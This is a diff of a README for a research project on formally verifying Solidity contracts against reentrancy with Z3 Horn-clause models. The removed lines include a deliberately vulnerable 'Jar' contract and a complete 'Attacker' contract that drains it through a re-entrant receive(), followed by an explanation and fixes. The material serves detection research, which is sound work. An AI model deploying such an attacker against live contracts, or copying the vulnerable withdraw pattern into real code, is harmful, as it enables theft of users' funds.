@@ -163,8 +163,9 @@ This is a working solution, but the previous options look much better becuase th
 
 As a case study, we apply formal verification in order to detect the reentrancy vulnerability of the jar contract.  We manually formalized a model of the jar contract, and use it to find a possible reentrancy which causes an unexpected change of persistent data, such as state variables of the contract and its asset balance of the native cryptocurrency.  The safety property to check is that any change of persistent data is deterministic, namely, the execution results are independent from unknown external contracts.  In case the security property is violated, we get an evidence showing how it happens.
 
-The solc compiler has rich features of formal verifications.   In order to make use of these solc features for detecting a reentrancy vulnerability, a programmer is required to put assertions properly, which has to be based on security knowledges.
-Our case study of formal verification indeed works to the above shown vulnerable smart contract without any modification of the solidity code, namely, a programmer is required neither to know about security nor to put additional assertions for reentrancy analysis.
+The solc compiler has rich features for formal verifications.   In order to detect a reentrancy vulnerability, making use of these solc features, it requires a programmer to put additional assertions properly, which has to be based on security knowledges.
+Our case study of formal verification indeed works to the above shown vulnerable smart contract without an additional assertions, namely, a programmer is required to know about security, neither.
+Currently (as of June 2024) solc doesn't offer a feature automatically to detect reentrancy vulnerability without explicit assertions in source code.
 
 <!-- A current drawback in comparison to existing solc formal verification is that our method may issue too many warnings, those are a kind of false positives.  It is not possible to automatically determine what kind of reentrancy should be accepted and what should not be, so we would like to leave this problem for future work.  Currently the logical model of our smart contract for formal verification is manually implemented.  The automatic model construction, that solc does for (almost) arbitrary solidity code, is missing in our side, and left for future work, too. -->
 ## Reentrancy analysis
@@ -177,90 +178,6 @@ We practice formal verification by means of SMT solver Microsoft's Z3, and we us
 - Solidity code of the secure smart contract ([Jar_locked.sol](Solidity/Jar_locked.sol))
 - SMTLIB2 model of the secure smart contract and the security property ([jar_locked.smt](smt/jar_locked.smt))
 
-### Example of reentrancy attack
-
-The following contract, a coin jar, is vulnerable because of the way <code>withdraw()</code> has been implemented.
-```
-// SPDX-License-Identifier: MIT
-pragma solidity >=0.6.12 <0.9.0;
-
-contract Jar {
-
-    mapping(address=>uint) public balance;
-
-    constructor() payable {
-
-    }
-
-    function deposit() public payable {
-        balance[msg.sender] += msg.value;
-    }
-
-    function withdraw() public {
-        require(balance[msg.sender] != 0, "zero balance");
-        (bool s,) = msg.sender.call{ value: balance[msg.sender] }("");
-        require(s, "In Jar.withdrow(), call() failed.");
-        balance[msg.sender] = 0;
-    }
-}
-```
-The expected use case is that anybody can make a deposit by calling <code>deposit()</code> with some value, and anytime in the future, the one can withdraw the deposit by calling <code>withdraw()</code>.
-The problem arises when one uses the following contract <code>Attacker</code> to attack <code>Jar</code>, assuming the above Solidity code is available as <code>./Jar.sol</code>.
-```
-// SPDX-License-Identifier: MIT
-pragma solidity >=0.6.12 <0.9.0;
-import "./Jar.sol";
-
-contract Attacker {
-
-    Jar public jar;
-    address public owner;
-
-    constructor(address _jar) payable {
-        jar = Jar(_jar);
-        owner = msg.sender;
-    }
-
-    function deposit() public {
-        jar.deposit{ value: 1 ether }();
-    }
-
-    function attack() public {
-        jar.withdraw();
-    }
-
-    receive() external payable {
-        if (address(jar).balance >= 1 ether) {
-            jar.withdraw();
-        }
-    }
-
-    function withdraw() public {
-        require (msg.sender == owner);
-        (bool s, ) = owner.call{ value: address(this).balance}("");
-        require (s);
-    }
-}
-```
-The story goes in the following way.
-The process starts from attacker's calling <code>deposit()</code> of <code>Attacker</code>; the balance of the jar contract now keeps that the contract <code>Attacker</code> has 1 ETH deposit.  Then the attacker calls <code>attack()</code>.  The execution goes to <code>withdraw()</code> of <code>Jar</code>, where it first checks that the message sender, i.e. the contract <code>Attacker</code> has deposited some ETH, and next it makes a payout by means of <code>call()</code>; as commonly done, it transfers money by sending the empty call data, i.e. <code>""</code>, to the depositor.
-When the <code>Attacker</code> contract receives money, its <code>receive()</code> is executed.  It checks that the jar contract has at least 1 ETH, and if so, it tries to further withdraw 1 ETH by calling <code>withdraw()</code> of the <code>Jar</code> contract, which causes the so-called <i>reentrancy</i>.
-As the condition <code>balance[msg.sender] != 0</code> is still satisfied, the jar contract again sends 1 ETH to the attacker, and it repeats until the ETH asset balance of the victim goes less than 1 ETH.
-
-### Problem analysis
-An arbitrary address can make a deposit, calling to <code>Jar.deposit()</code> with sending money to deposit.  As <code>Jar</code> pays back money exactly to the depositor, there is a possibility of its sending money back to a smart contract rather than an EOA (externally owned account).  The prerequisite for a successful withdrawal is that the balance <code>balance[msg.sender]</code> is positive.  In the function <code>withdraw()</code>, the balance is set to be 0 after the actual money transfer, the prerequisite is samely satisfied in case of a reentrancy, hence it repeatedly sends money.  After the attacker stops the process, the the whole transaction will successfully be over without causing a revert; it just assigns <code>0</code> to <code>balance[msg.sender]</code> after all transfers were done.
-
-Based on the above observation, our static program analyzer should issue a warning on a potential vulnerability due to the reentrancy attack, when there is a function which makes a money transfer such as:
-
-1. Preconditions of the money transfer may be satisfied in a recursive call.
-2. After carrying out the repeated money transfer, the transaction may successfully complete.
-
-<!-- Note that a use of mutex makes the above 1. unsatisfied, and that Solidity's change (version 0.8 and above) to cause a revert in case of underflow makes 2. unsatisfied. -->
-
-A commonly suggested cure for the vulnerability is to make use of mutex to prohibit the reentrancy.  Changing the balance before invoking <code>call</code> is also a solution.  On the other hand, if the business logic were to subtract the amount of the transferred money, it could cause a revert due to the underflow, and as a result, all unexpected sendings could be cancelled.
-
-<!-- and a change of state variables before money transfer  -->
-
 ### Formal modeling
 
 We give formal models of Jar.sol and its variants which are free from the reentrancy vulnerability.  We use the Horn clause-based framework which is same as one employed by the official solc compiler for its built-in formal verification [[1]](#1) [[2]](#2).
@@ -268,8 +185,6 @@ The aim of our formal modeling is:
 
 1. To do verification without relying on explicit assertions in source codes which have to be done by a programmer with security knowledges, and
 2. the process to obtain a formal model and security properties from a source code is formal so that it is to automatize.
-
-Currently (as of June 2024) solc doesn't offer a feature automatically to detect reentrancy vulnerability without explicit assertions in source code.
 
 We describe how the above mentioned Jar contract should be modeled in Horn clauses.  The code below follows SMTLIB2 format which theorem provers such as Z3 accepts as input.  The modeling of the contract follows existing research papers.
 
